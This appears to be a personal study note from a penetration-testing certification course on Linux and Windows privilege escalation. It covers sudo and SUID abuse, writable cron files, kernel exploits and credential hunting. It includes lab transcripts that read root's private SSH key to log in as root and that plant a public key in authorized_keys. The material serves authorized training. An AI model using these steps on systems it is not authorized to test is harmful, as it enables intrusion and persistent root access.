
## Quick-Use

**Commands**:
- `uname -a` - (Linux) show kernel version to cross-check against known kernel exploits
- `sudo -l` - list what `sudo` perms the current user has
- `sudo su -` - switch to root when sudo allows it (`(ALL : ALL) ALL`)
- `sudo -u USER /bin/echo hi` - run a command as USER (e.g. a `NOPASSWD` entry - no password needed)
- `dpkg -l` | `pacman -Q` | `rpm -qa` - (Linux) list installed software to hunt vulnerable versions; Windows: browse `C:\Program Files`
- `ssh-keygen -f KEYNAME` - gen a keypair (for the write-access-to-`.ssh` escalation)
- `echo "ssh-rsa AAAA...== user@host" >> /root/.ssh/authorized_keys` - append your pubkey (write access)
- `chmod 600 id_rsa` - tighten key perms (ssh rejects world-readable keys)
- `ssh root@TARGETIPADDR -i id_rsa` - log in with a looted or placed private key
- Cron write-targets to check: `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root`

*Tools & Resources*:
- [[2_Studies/Courses/Current/CERTPREP - CPTS/1_Hack.codex/4_Privilege_Escalation/LinPEAS, WinPEAS, & SharPEAS|LinPEAS / WinPEAS / SharPEAS]] - `PEASS` automated privesc enumeration (well-maintained)
- [LinEnum](https://github.com/rebootuser/LinEnum.git) - Linux enum script
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) - Linux enum script
- [Seatbelt](https://github.com/GhostPack/Seatbelt) - Windows enum script
- [JAWS](https://github.com/411Hall/JAWS) - Windows enum script
- [GTFOBins](https://gtfobins.github.io) - Unix binaries exploitable via `sudo`/`SUID` to break out to a shell
- [LOLBAS](https://lolbas-project.github.io/#) - Windows living-off-the-land binaries for privileged actions (download / exec)
- [HackTricks](https://book.hacktricks.wiki) - privesc checklists: [Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) · [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - privesc checklists (Linux / Windows)

> [!warning] Enum scripts are noisy
> They run many detection-known commands and generate a lot of "noise" that can trip AV/EDR or security monitoring — possibly blocking the script or raising a compromise alarm. In sensitive/monitored environments, prefer manual enumeration.

## General

**Objectives**:
- If the software found on a system is updated, OR AV/EDR systems are active or the environment is otherwise sensitive, it is useful to use the `dpkg -l`|`pacman -Q`|`rpm -qa` and similar commands on linux, or look at `C:\Program Files` on Windows, to check the newest software manually for known discovered vulns via cross-referencing ExploitDB/`Searchsploit`/NVD. Otherwise, `PEAS` scripts should handle software enumeration automatically — but note they may miss recently disclosed CVEs if their signatures are outdated.

- **Kernel exploits**: on an old/unpatched OS, check the kernel (`uname -a`) against known exploits (Google / `searchsploit`). Classic example: `DirtyCow` (`CVE-2016-5195`) — [PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs). ***~={red}Kernel exploits can panic or crash the box=~*** — lab-test first; run on client/production systems only with explicit approval and coordination.

- **User privileges** — three common escalation vectors: **1.** `sudo`  **2.** `SUID` binaries  **3.** Windows token privileges (see [[2_Studies/Courses/Current/CERTPREP - CPTS/1_Hack.codex/4_Privilege_Escalation/Token Impersonation|Token Impersonation]]).
    - `sudo -l` lists our sudo perms. `(ALL : ALL) ALL` -> `sudo su -` for root; a `NOPASSWD:` entry runs without a password (`sudo -u USER cmd` to run as that user). Look the allowed binary up in `GTFOBins` for a root break-out.
    - `SUID` binaries execute as their owner (often root) regardless of caller — an exploitable one (again via `GTFOBins`) yields a shell as the owner.

- Write perms over these can provide a valid escalation path via exploiting cron jobs.
    1. `/etc/crontab`
    2. `/etc/cron.d`
    3. `/var/spool/cron/crontabs/root`

- Can look for exposed creds in `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). This is also often discovered in `PEAS` if usable

- SSH Keys:
    - If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it
        - See [[0_General - PrivEsc#Examples|Examples]] for what it looks like to have read access
    - If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. You can do this by using `ssh-keygen -f KEYNAME` to generate a key file named `KEYNAME`
        - After copying the `KEYNAME.pub` file to the target machine and adding it to the `/root/.ssh/authorized_keys` file, you can use the `KEYNAME` file in SSH to login as `root`. See [[0_General - PrivEsc#Examples|Examples]] for a worked out example of this.

**Overview**:
Since init access is usually a low-level user, we often need to find local vulns to escalate to privileged user  (preferably `root` or `SYSTEM`).

**Mitigation**:

## Examples

### SSH Keys

#### If read access

```shell
user2@ng-431876-gettingstartedprivesc-coum4-777f5f9d86-h8qll:~$ ls -lah /
total 0
drwxr-xr-x.    1 root root   40 Feb 28 05:10 .
drwxr-xr-x.    1 root root   40 Feb 28 05:10 ..
lrwxrwxrwx.    1 root root    7 Jul 20  2020 bin -> usr/bin
drwxr-xr-x.    2 root root    6 Apr 15  2020 boot
drwxr-xr-x.    5 root root  340 Feb 28 05:10 dev
drwxr-xr-x.    1 root root   17 Feb 12  2021 etc
drwxr-xr-x.    1 root root   19 Feb 12  2021 home
lrwxrwxrwx.    1 root root    7 Jul 20  2020 lib -> usr/lib
lrwxrwxrwx.    1 root root    9 Jul 20  2020 lib32 -> usr/lib32
lrwxrwxrwx.    1 root root    9 Jul 20  2020 lib64 -> usr/lib64
lrwxrwxrwx.    1 root root   10 Jul 20  2020 libx32 -> usr/libx32
drwxr-xr-x.    2 root root    6 Jul 20  2020 media
drwxr-xr-x.    2 root root    6 Jul 20  2020 mnt
drwxr-xr-x.    2 root root    6 Jul 20  2020 opt
dr-xr-xr-x. 1126 root root    0 Feb 28 05:10 proc
drwxr-x---.    1 root user2  18 Feb 12  2021 root
drwxr-xr-x.    1 root root   66 Feb 28 05:12 run
lrwxrwxrwx.    1 root root    8 Jul 20  2020 sbin -> usr/sbin
drwxr-xr-x.    2 root root    6 Jul 20  2020 srv
dr-xr-xr-x.   13 root root    0 Feb 28 05:10 sys
drwxrwxrwt.    1 root root   28 Aug 19  2020 tmp
drwxr-xr-x.    1 root root   81 Jul 20  2020 usr
drwxr-xr-x.    1 root root   30 Aug 19  2020 var

user2@ng-431876-gettingstartedprivesc-coum4-777f5f9d86-h8qll:/root$ ls -lah
total 20K
drwxr-x---. 1 root user2   18 Feb 12  2021 .
drwxr-xr-x. 1 root root    40 Feb 28 05:10 ..
-rwxr-x---. 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x---. 1 root user2 3.1K Dec  5  2019 .bashrc
-rwxr-x---. 1 root user2  161 Dec  5  2019 .profile
drwxr-x---. 1 root user2   20 Feb 12  2021 .ssh
-rwxr-x---. 1 root user2 1.3K Aug 19  2020 .viminfo
-rw-------. 1 root root    33 Feb 12  2021 flag.txt
user2@ng-431876-gettingstartedprivesc-coum4-777f5f9d86-h8qll:/root$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
PtQ8csvHq/GatgSo8oVyskZIRbWb7QvCQI7JsT+Pr4ieQayNIoDm6+i9F1hXyMc0VsAqMk
05z9YKStLma0iN6l81Mr0dAI63x0mtwRKeHvJR+EiMtUTlAX9++kQJmD9F3lDSnLF4/dEy
G4WQSAH7F8Jz3OrRKLprBiDf27LSPgOJ6j8OLn4bsiacaWFBl3+CqkXeGkecEHg5dIL4K+
[CONTINUES...]
```

That private key that got printed out can be captured into an id_rsa file and used to ssh in:
```bash
┌─[l1ch@parrot]─[~/loot/keys]
└──╼ $vim id_rsa
┌─[l1ch@parrot]─[~/loot/keys]
└──╼ $cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
[LONG KEY CONTINUES]
ZGQvP/9j2jexpc1Sq0g+l7hKK/PmOrXRk4FFXk+j6l0m7z0TGXzVDiT+yCAnv6Rla/vd3e
7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----

┌─[l1ch@parrot]─[~/loot/keys]
└──╼ $chmod 600 id_rsa 
┌─[l1ch@parrot]─[~/loot/keys]
└──╼ $ssh root@154.57.164.66 -p 30865 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.12.52-talos x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ng-431876-gettingstartedprivesc-coum4-777f5f9d86-h8qll:~#
```

#### If write access

Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```shell
0xl1ch@htb[/htb]$ vim id_rsa
0xl1ch@htb[/htb]$ chmod 600 id_rsa
0xl1ch@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```

Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.

If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:

```shell
0xl1ch@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```
This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:

```shell
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, the remote server should allow us to log in as that user by using our private key:

```shell
0xl1ch@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost#
```

As we can see, we can now ssh in as the user `root`.

## Further Reading

*Deeper grounding*:
- HTB [*Linux Privilege Escalation*](https://academy.hackthebox.com/module/details/51) module - full Linux privesc methodology, each of these vectors in depth.
- HTB [*Windows Privilege Escalation*](https://academy.hackthebox.com/module/details/67) module - full Windows privesc methodology.

## Glossary